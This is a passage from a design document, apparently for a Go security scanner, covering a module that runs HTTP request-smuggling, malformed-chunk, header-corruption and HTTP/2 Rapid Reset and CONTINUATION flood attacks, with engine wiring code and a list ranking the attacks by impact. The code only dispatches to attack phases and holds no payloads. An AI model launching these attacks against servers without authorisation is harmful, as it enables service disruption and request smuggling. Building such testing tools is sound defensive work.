    findings = append(findings, m.runSmugglingAttacks(ctx, target, cfg)...)

    // Phase 2: Malformed chunk encoding
    findings = append(findings, m.runChunkAttacks(ctx, target, cfg)...)

    // Phase 3: Header corruption
    findings = append(findings, m.runHeaderAttacks(ctx, target, cfg)...)

    // Phase 4: Version and method tricks
    findings = append(findings, m.runVersionAttacks(ctx, target, cfg)...)
    findings = append(findings, m.runMethodAttacks(ctx, target, cfg)...)

    // Phase 5: Connection-level attacks
    findings = append(findings, m.runConnectionAttacks(ctx, target, cfg)...)

    // Phase 6: HTTP/2 attacks (if target supports TLS)
    if strings.HasPrefix(target, "https://") {
        findings = append(findings, m.runH2Attacks(ctx, target, cfg)...)
    }

    return findings
}
```

### Engine Integration

The engine already has precedent for raw TCP attacks via `SlowHTTPModule.Run()`.
The new module follows the same pattern:

```go
// In engine.go Run(), after the normal executeAll():

// Execute raw TCP attack modules.
for _, mod := range e.modules {
    if rawMod, ok := mod.(RawTCPRunner); ok {
        rawFindings := rawMod.Run(ctx, e.config.Target, RawSocketConfig{
            Concurrency: e.config.Concurrency,
            Timeout:     e.config.Timeout,
        })
        for _, f := range rawFindings {
            e.reporter.AddFinding(f)
        }
    }
}
```

### Attack Priority by Impact

Based on real-world testing and CVE history, attacks should run in this order:

1. **Header null bytes** -- #1 scanner/server killer in practice
2. **CL/TE smuggling** -- widely exploitable, high impact
3. **Chunk encoding abuse** -- historical RCE vectors (nginx, Apache)
4. **H2 CONTINUATION flood** -- recent CVEs (2024), high impact
5. **H2 Rapid Reset** -- CVE-2023-44487, widely patched but still relevant
6. **TE.TE obfuscation** -- proxy-dependent, common in real deployments
7. **Pipeline flood** -- resource exhaustion, effective against buffering servers
8. **HTTP version confusion** -- low impact but good for fingerprinting
9. **Method/URI tricks** -- mostly informational, helps identify parser quirks

---

## References

- [RFC 9112 - HTTP/1.1](https://datatracker.ietf.org/doc/html/rfc9112) -- HTTP/1.1 message syntax
- [RFC 9113 - HTTP/2](https://datatracker.ietf.org/doc/html/rfc9113) -- HTTP/2 frame format and semantics
- [RFC 7541 - HPACK](https://datatracker.ietf.org/doc/html/rfc7541) -- Header compression for HTTP/2
- [The HTTP Garden (2024)](https://arxiv.org/html/2405.17737v1) -- 122 parsing discrepancies across HTTP implementations
- [HTTP Desync Attacks (PortSwigger)](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn) -- Request smuggling research
- [CVE-2023-44487](https://nvd.nist.gov/vuln/detail/CVE-2023-44487) -- HTTP/2 Rapid Reset
- [CVE-2024-27316](https://nvd.nist.gov/vuln/detail/CVE-2024-27316) -- Apache HTTP/2 CONTINUATION flood
- [CVE-2024-27983](https://nvd.nist.gov/vuln/detail/CVE-2024-27983) -- Node.js HTTP/2 CONTINUATION flood
- [CVE-2013-2028](https://nvd.nist.gov/vuln/detail/CVE-2013-2028) -- nginx chunked encoding stack overflow
- [nginx Chunked Size Exploit (Rapid7)](https://www.rapid7.com/db/modules/exploit/linux/http/nginx_chunked_size/) -- nginx chunked encoding RCE
- [Exploiting HTTP Parsers Inconsistencies](https://blog.bugport.net/exploiting-http-parsers-inconsistencies) -- Parser differential attacks
- [HTTP/2 From Scratch](https://kmcd.dev/posts/http2-from-scratch-part-2/) -- Building HTTP/2 frame parser in Go
- [Go net/http issue #25116](https://github.com/golang/go/issues/25116) -- User-defined behavior for malformed requests
- [HackTricks: HTTP Request Smuggling](https://book.hacktricks.xyz/pentesting-web/http-request-smuggling) -- Comprehensive smuggling guide
- [Imperva: Chunked Extension Smuggling](https://www.imperva.com/blog/smuggling-requests-with-chunked-extensions-a-new-http-desync-trick/) -- Chunk extension desync
